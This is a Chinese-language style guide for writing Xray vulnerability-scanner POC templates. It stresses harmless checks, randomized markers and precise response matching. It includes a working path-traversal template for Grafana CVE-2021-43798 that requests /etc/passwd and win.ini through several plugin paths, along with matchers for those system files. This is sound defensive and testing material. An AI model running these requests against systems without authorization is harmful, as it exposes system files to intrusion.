# Xray POC 高质量编写规范

## 核心原则

### 1. 危害性（Harmfulness）

POC 必须**无害**，禁止以下行为：
- 上传 shell 不删除
- 覆盖源文件
- 删除文件
- 修改密码
- 操作数据库
- 执行破坏性命令

### 2. 随机性（Stochasticity）

关键变量应使用随机值：
- 避免使用固定值（如固定的文件名、字符串、MD5 值）
- 使用 `randomInt()` 生成随机数
- 随机数范围要足够大，避免碰撞

**推荐：**
```yaml
set:
  s1: randomInt(100000, 200000)
```

**不推荐：**
```yaml
set:
  s1: "fixed_value"
```

### 3. 确定性（Deterministic）

返回内容必须有**唯一确定的标识**：

**警告：** 切忌在第一个规则中的 expression 只使用一个 `response.status == 200` 这样的规则，这样基本等于会多发一个请求。

**应该避免：**
- 仅使用单一条件判断（如只判断 `response.status` 或 `response.content_type`）
- 使用容易变化的值（如 content length）
- 使用容易出现的值（如 "upload success"、"admin"、"root"）
- 使用空页面/空图片的 MD5 值

**推荐做法：**
```yaml
expression: |
  response.status == 200 && 
  response.body_string.contains(string(s1 - s2))
```

### 4. 通用性（Versatility）

兼顾不同环境和平台：
- Linux 和 Windows 双平台支持
- 不同版本的应用支持
- 多种插件/路径尝试

## 文件读取类漏洞匹配规范

| 系统 | 目标文件 | 匹配规则 |
|------|----------|----------|
| Linux | /etc/passwd | `"root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)` |
| Windows | c:/windows/win.ini | `response.body_string.contains("for 16-bit app support")` |

## 常见错误

### 错误 1：只判断状态码
```yaml
# 错误！
expression: |
  response.status == 200
```

### 错误 2：使用容易变化的值
```yaml
# 错误！
expression: |
  response.headers["Content-Length"] == "1234"
```

### 错误 3：使用常见字符串
```yaml
# 错误！
expression: |
  response.body_string.contains("error")
```

### 错误 4：固定值验证
```yaml
# 错误！
set:
  s1: "123456"
expression: |
  response.body_string.contains("123456")
```

## 优化示例

### 优化前（基础版本）
```yaml
name: poc-yaml-grafana-cve-2021-43798
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: |
  r0()
```

### 优化后（多插件 + 跨平台）
```yaml
name: poc-yaml-grafana-cve-2021-43798-optimized
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
  r1:
    request:
      cache: true
      method: GET
      path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
    expression: |
      response.status == 200 && response.body_string.contains("for 16-bit app support")
  r2:
    request:
      cache: true
      method: GET
      path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
  r3:
    request:
      cache: true
      method: GET
      path: /public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
    expression: |
      response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: |
  r0() || r1() || r2() || r3()
```

## 命名规范

### POC 名称格式
```
poc-yaml-{产品名}-{漏洞类型}-{cve编号或描述}
```

**示例：**
- `poc-yaml-grafana-cve-2021-43798`
- `poc-yaml-apache-shiro-cve-2016-4437`
- `poc-yaml-springcloud-gateway-rce`

### 作者信息
```yaml
detail:
  author: your_name
  links:
    - https://github.com/yourname
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798
```

## 注释规范

YAML 中可以使用 `#` 添加注释：

```yaml
# 定义随机变量
set:
  s1: randomInt(100000, 200000)  # 用于命令执行验证

rules:
  r0:
    request:
      cache: true
      method: POST
      path: /exec  # 命令执行接口
```

## 测试建议

1. **本地测试**：在本地搭建漏洞环境测试 POC
2. **多版本测试**：测试不同版本的应用
3. **边界测试**：测试边界条件和异常情况
4. **误报测试**：确保不会误报正常页面
